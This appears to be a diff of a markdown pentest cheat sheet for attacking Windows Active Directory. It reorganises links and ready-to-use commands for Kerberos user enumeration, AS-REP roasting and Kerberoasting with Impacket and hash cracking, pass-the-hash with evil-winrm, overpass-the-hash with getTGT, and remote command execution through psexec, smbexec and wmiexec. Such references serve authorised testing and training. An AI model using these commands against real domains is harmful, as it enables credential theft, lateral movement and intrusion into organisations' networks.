@@ -50,6 +50,7 @@ PowerShell Active Directory Module (on DC)
 [AD Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)     
 [AD Lateral Movement and Persistence Cheatsheet](https://bhanusnotes.blogspot.com/2020/12/ad-pentest-lateral-movement-persistance.html)  
 [AD Cheat sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)   
+[Pentesting AD CheatSheet](https://i.ibb.co/TKYNCNP/Pentest-ad.png) 
 [Integratio IT Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)  
 
 ## General Tools  
@@ -62,7 +63,8 @@ PowerShell Active Directory Module (on DC)
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
 ## Kerberos (Port 88)   
-[Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
+Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
+[Messing With Kerberos Using Rubeus](https://endark.gitbook.io/kb/windows/lab-attacks/messing-with-kerberos-using-rubeus) 
 [Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
 [Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  
 [How Kerberos Works](https://www.tarlogic.com/blog/how-kerberos-works/)  
@@ -70,8 +72,12 @@ PowerShell Active Directory Module (on DC)
 
     ./kerbrute userenum userlist.txt -d [name] --dc [name]     
 
-### Kerberoasting with Impacket 
+### Impacket 
+Check for Kerberoasting with Impacket 
 
+    GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john
+
+Scripts 
 Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        
 
     python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
@@ -84,29 +90,27 @@ Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't ne
 
     evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]    
     
-    ## Check for Kerberoasting: 
-
-- GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john
-
-## GetUserSPNs
 
 ASREPRoast:
-- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
-- impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+     impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+     impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
 Kerberoasting: 
-- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 
+
+     impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 
 
 Overpass The Hash/Pass The Key (PTK):
-- python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
-- python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
-- python3 getTGT.py <domain_name>/<user_name>:[password]
+ 
+    python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+    python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+    python3 getTGT.py <domain_name>/<user_name>:[password]
 
-## Using TGT key to excute remote commands from the following impacket scripts:
+### Using TGT key to excute remote commands from the following impacket scripts:
 
-- python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-- python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-- python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+    python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+    python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+    python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 
 
 ## LDAP (Port 636)
@@ -178,18 +182,12 @@ Powershell Script
 [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
 
 
+[Active Directory Enumeration | ATTL4S](https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Enumeration.pdf) 
 
-## Active Directory Enumeration | ATTL4S
-https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Enumeration.pdf
+[Adsecurity Blog](https://adsecurity.org/) 
 
-## Adsecurity Blog
-https://adsecurity.org/
+[RedTeam Security Live Hacking Demonstration](https://www.youtube.com/watch?v=k6EOhO3JKCQ) 
 
-## RedTeam Security Live Hacking Demonstration 
-https://www.youtube.com/watch?v=k6EOhO3JKCQ
-
-## Pentesting AD CheatSheet
-https://i.ibb.co/TKYNCNP/Pentest-ad.png
 
 
 ## NetNTLMtoSilverTicket | NotMedic's Github
